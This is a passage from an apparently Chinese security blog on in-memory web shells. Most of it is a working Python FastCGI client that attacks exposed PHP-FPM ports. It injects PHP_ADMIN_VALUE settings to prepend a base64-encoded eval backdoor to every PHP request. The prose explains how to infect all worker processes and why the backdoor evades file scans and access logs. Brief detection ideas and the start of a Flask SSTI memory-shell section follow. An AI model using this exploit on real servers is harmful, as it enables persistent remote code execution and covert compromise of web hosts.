class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        <span class="hljs-variable language_">self</span>.host = host<br>        <span class="hljs-variable language_">self</span>.port = port<br>        <span class="hljs-variable language_">self</span>.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-variable language_">self</span>.sock.settimeout(<span class="hljs-variable language_">self</span>.timeout)<br>        <span class="hljs-variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br><br>            <span class="hljs-variable language_">self</span>.sock.connect((<span class="hljs-variable language_">self</span>.host, <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.port)))<br><br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            <span class="hljs-variable language_">self</span>.sock.close()<br>            <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>            + bchr(fcgi_type) \<br>            + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>            + bchr(<span class="hljs-number">0</span>) \<br>            + bchr(<span class="hljs-number">0</span>) \<br>            + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = <span class="hljs-variable language_">self</span>.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-variable language_">self</span>.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>            + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>            + bchr(<span class="hljs-variable language_">self</span>.keepalive) \<br>            + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += <span class="hljs-variable language_">self</span>.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>                FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>            FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>                FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(<br>            FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-variable language_">self</span>.sock.send(request)<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.__waitForResponse(requestId)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = <span class="hljs-variable language_">self</span>.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = <span class="hljs-variable language_">self</span>.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    <span class="hljs-variable language_">self</span>.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                <span class="hljs-variable language_">self</span>.requests[requestId]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.host, <span class="hljs-variable language_">self</span>.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>,<br>                        default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>,<br>                        default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-comment"># &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br>        <span class="hljs-comment"># &#x27;PHP_VALUE&#x27;: &#x27;&#x27;,</span><br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On auto_prepend_file =\&#x27;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&#x27;&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br><br></code></pre></td></tr></table></figure>

<p>由于使用了<code>auto_prepend_file</code>，因此我们只需要访问服务器上任意一个正常的 PHP 文件，无需任何修改，都能触发我们的内存马。</p>
<p><img src="https://img-blog.csdnimg.cn/0de5ae8f12df4da997c3c2799ba07e44.png" srcset="/img/loading.gif" lazyload alt="image-20230228185217368"></p>
<p>​		当然，这个方案也有局限性，因为是内存马，所以他实际上是和PHP-FPM的 Worker 进程绑定的，因此，如果服务器上有多个Worker进程，我们就需要多发送刚才的请求几次，才能让我们的payload“感染”每一个进程。</p>
<h4 id="内存马的检测"><a href="#内存马的检测" class="headerlink" title="内存马的检测"></a>内存马的检测</h4><p>​		既然是内存马，因此我们无法从代码扫描中发现。并且由于他只是修改了内存中的 PHP 配置，我们也无法从<code>PHP.ini/.user.ini/php-fpm.conf</code>等文件内容中检测。真正添加内存马由于只需要对fpm监听的端口发送请求，因此也无法从webserver的accesslog中发现问题。但是我们是可以通过rasp之类的工具，通过检查<code>auto_prepend_file/auto_append_file/allow_url_inclue</code>配置的变化（虽然目前很多 rasp 也不会做这些操作）来做检测。<br>​		另外，由于触发方式可以是任意一个 PHP 文件，所以，我们想从后续的访问行为中做检查也有一定难度，但是可以从网络流量中检查对应的后门 payload，或者从进程的行为中，来做检查。</p>
<h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1720/">利用 PHP-FPM 做内存马的方法</a></p>
<h2 id="Python内存马"><a href="#Python内存马" class="headerlink" title="Python内存马"></a>Python内存马</h2><h3 id="Python内存马原理"><a href="#Python内存马原理" class="headerlink" title="Python内存马原理"></a>Python内存马原理</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到<span class="hljs-built_in">render_template_string</span>()进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。<br></code></pre></td></tr></table></figure>

<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121005608">https://blog.csdn.net/rfrder/article/details/121005608</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><strong>app.addurl_rule()用法</strong></p>
<p><code>app.add_url_rule()</code>是一种生成url规则的函数，在flask中<code>@app.route(&#39;&lt;url&gt;&#39;)</code>就是调用的<code>app.add_url_rule()</code>，简单理解就是该函数将url中的<code>/&lt;str&gt;</code>绑定指定函数执行。。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.add_url_rule(<span class="hljs-string">&#x27;/index/&#x27;</span>,<span class="hljs-attribute">endpoint</span>=<span class="hljs-string">&#x27;index&#x27;</span>,view_func=index，methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p>app.addurl_rule的三个参数：第一个参数指定url规则，当访问&#x2F;index符合本条规则，endpoint设置url的名字，url_for可通过名字返回url，view_func参数指定本规则绑定的函数,methods指定规则访问限制。</p>
<p><strong>lambda表达式</strong></p>
<p>lambda表达式官方语言<code>匿名函数</code>，基本格式。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-built_in">lambda</span> [arg1 [,arg2,.....argn]]<span class="hljs-symbol">:expression</span><br></code></pre></td></tr></table></figure>

<p>实际上就是函数的简写，去掉了函数名，简单写个比较就明白了。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">lambda <span class="hljs-variable language_">x</span>,<span class="hljs-variable language_">y</span>:<span class="hljs-variable language_">x</span>+<span class="hljs-variable language_">y</span><br>等价于<br>def add(<span class="hljs-variable language_">x</span>,<span class="hljs-variable language_">y</span>):<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable language_">x</span>+<span class="hljs-variable language_">y</span>;<br></code></pre></td></tr></table></figure>

<p><strong>偏函数partial</strong></p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">在python中，如果在设置某个函数的时候需要把函数的某个参数设置为固定的值，就可以使用偏函数来实现.<br></code></pre></td></tr></table></figure>

<p>可以理解为将函数的某些参数设置为固定值，重新命名方便使用，举个例子</p>
